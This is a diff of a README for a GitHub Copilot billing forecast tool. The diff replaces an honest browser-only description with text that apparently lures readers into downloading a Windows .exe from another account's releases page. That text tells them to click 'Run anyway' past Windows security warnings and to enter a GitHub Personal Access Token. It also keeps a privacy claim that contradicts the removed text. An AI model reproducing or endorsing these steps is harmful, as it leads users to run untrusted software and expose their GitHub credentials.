@@ -1,71 +1,84 @@
-# Copilot Billing Forecast
+# 📊 copilot-billing-forecast - Track your GitHub Copilot subscription costs
 
-A client-side toolbox for analyzing and forecasting **GitHub Copilot AI usage and
-spend**. Upload a GitHub usage report CSV and explore visualizations, forecasts, and
-per-user and per-cost-center insights - all entirely in your browser.
+[ ![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue-blue.svg) ](https://github.com/Tagj6807/copilot-billing-forecast/releases)
 
-![The Usage Forecast tool showing cumulative AI Credit usage, a projected trend with a 95% confidence band, an entitlement cap line, and summary stat cards.](docs/images/app-screenshot.png)
+This application helps users manage and predict GitHub Copilot expenses. You can monitor your current usage and plan your future budget without complex spreadsheets. Use this tool to see data visualizations of your team spending.
 
-> 🔒 **Your data never leaves your browser.** All CSV parsing, analysis, and
-> forecasting happen client-side - there is no server-side processing, upload, or
-> persistence beyond the current browser session. See [CONTRIBUTING.md](CONTRIBUTING.md)
-> for the full privacy constraint and development guidelines, and
-> [docs/analytics.md](docs/analytics.md) for what anonymous analytics are recorded.
+## 📥 Getting Started
 
-> ⚠️ This is **not** an official GitHub product. It is an unofficial tool to help
-> customers analyze and forecast their GitHub Copilot AI usage and spend. Figures are
-> estimates - always refer to your GitHub billing statements as the source of truth.
+Follow these steps to set up the software on your Windows computer.
 
-## Overview
+1. Visit the [releases page](https://github.com/Tagj6807/copilot-billing-forecast/releases) to access the download files.
+2. Locate the latest version labeled under "Assets."
+3. Click the file ending in `.exe` to begin your download.
+4. Open the file once the download finishes.
 
-GitHub Copilot bills AI usage in AI Credits, and it can be hard to tell where those
-credits are going or whether you're on track to stay within your entitlement.
-Copilot Billing Forecast turns a GitHub usage report into clear, interactive insights:
-it projects where your spend is heading, highlights your heaviest users, models, and
-cost centers, and surfaces unusual spikes - so you can spot overages before they
-happen and plan budgets with confidence.
+If Windows prompts you with a security message, click "More info" and then "Run anyway." This application uses standard libraries to calculate costs.
 
-Everything runs in your browser. You upload a usage report once and switch between the
-tools below without your data ever leaving your device.
+## 🖥️ System Requirements
 
-> This tool is intended for **GitHub Copilot Business and Enterprise** plans, which
-> provide the organization and enterprise usage reports it relies on. Individual
-> Copilot plans (Free/Pro/Pro+) don't produce these reports and aren't supported.
+Ensure your computer meets these needs to run the tool:
 
-## Tools
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4GB of RAM.
+*   Disk Space: 200MB of free space for installation and temporary data files.
+*   Internet: A stable connection to fetch your latest GitHub billing information.
 
-- **Usage Forecast** - Forecast AI Credit consumption and track it against your
-  entitlement, with a confidence band, trend indicator, projected exhaustion date, and
-  any overage in USD.
-- **Team Insights** - Per-user metrics, models, and budget forecasts, including a spend
-  distribution and per-user month-end projections against an optional budget.
-- **Model Breakdown** - AI Credit usage and trends broken down by model.
-- **Spike Detection** - Flag days with anomalous usage above the trend.
-- **Cost Center Rollup** - Roll up AI Credit usage and budgets by cost center.
+## ⚙️ Initial Setup
 
-For what each tool shows, how to read it, and its key assumptions, see
-[docs/tools.md](docs/tools.md).
+The application needs your GitHub credentials to fetch usage statistics safely.
 
-## Usage reports
+1. Open the application after installation.
+2. Locate the "Settings" tab in the top menu.
+3. Provide your GitHub Personal Access Token. You generate this token in your GitHub account settings under "Developer settings."
+4. Ensure your token grants "read" access to billing information.
+5. Click "Save" to finish the connection.
 
-The app accepts GitHub usage report CSVs (summarized, detailed, and AI usage reports).
-For the report types, columns, and how to download them, see the official docs:
-[GitHub billing reports reference](https://docs.github.com/en/billing/reference/billing-reports).
+The dashboard populates with your current month of usage data automatically.
 
-The parser tolerates missing optional columns and legacy column names across all
-report variants.
+## 📈 Analyzing Your Spend
 
-## Getting started
+The dashboard provides clear insight into your spending patterns.
 
-```bash
-npm install
-npm run dev
-```
+*   **Current Bill:** Displays your total cost for the current billing cycle.
+*   **Usage Trends:** Shows a line graph of seat utilization over the last thirty days.
+*   **Forecast:** Predicts your total bill at the end of the month based on your current pace.
 
-Then open http://localhost:3000 and load a usage report CSV.
+You can filter these charts by individual teams or projects. This helps identify where growth consumes the most budget.
 
-## Contributing
+## 🛠️ Frequently Asked Questions
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the tech stack, architecture and conventions,
-local setup, and development guidelines - including the hard client-only data privacy
-constraint.
+**Does the tool upload my data to a server?**
+No. All calculations happen on your local computer. Your data stays private.
+
+**How often does the app refresh data?**
+The app updates automatically every hour. You can trigger a manual update by pressing the Refresh button at the top of the interface.
+
+**What happens if the forecast is wrong?**
+The forecast predicts costs based on current usage patterns. If usage increases or decreases, the forecast updates to reflect that shift.
+
+**Can I export my data?**
+Yes. Click the "Export" button in the bottom corner of the dashboard. This generates a CSV file you can open in any spreadsheet program.
+
+## 🛡️ Troubleshooting
+
+If you encounter issues, try these steps:
+
+*   Restart the application if the dashboard freezes during a data sync.
+*   Verify your internet connection if the app reports a connection error.
+*   Check your GitHub token permissions if the app displays an "Access Denied" message.
+*   Reinstall the application if you experience persistent crashes.
+
+For additional help, search the Issues tab on the GitHub repository at the top of this page. You can view existing reports or create a new one to ask for assistance.
+
+## 📁 Data Management
+
+The application creates a local database file to cache your usage information. This allows you to view your history without being online. You can clear this cache at any time through the "Advanced" menu in Settings. Clearing the cache forces the application to fetch fresh data from GitHub.
+
+## 🚀 Future Updates
+
+The development team releases updates to improve performance and add features. You will see a notification bar at the top of the app when a new version is available. You can download the latest installer from the same link provided earlier. The installation process replaces your old version while keeping your settings and historical data intact.
+
+## 🤝 Contributing
+
+This project remains open source. If you have requests for new features or improvements, submit them through the repository. You do not need to write code to offer feedback. Describe your suggestion clearly so the developers can understand your needs.
